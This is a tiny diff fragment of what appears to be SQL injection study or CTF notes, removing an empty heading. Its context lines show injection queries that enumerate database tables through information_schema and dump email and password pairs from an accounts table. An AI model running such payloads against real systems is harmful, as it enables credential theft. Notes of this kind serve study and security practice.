@@ -435,5 +435,3 @@ SELECT 1, table_name,3 FROM information_schema.tables limit 1,1-- -
 SELECT group_concat(email,0x3a,Password) from awd.accounts limit 1,1;
 ```
 
-## 
-
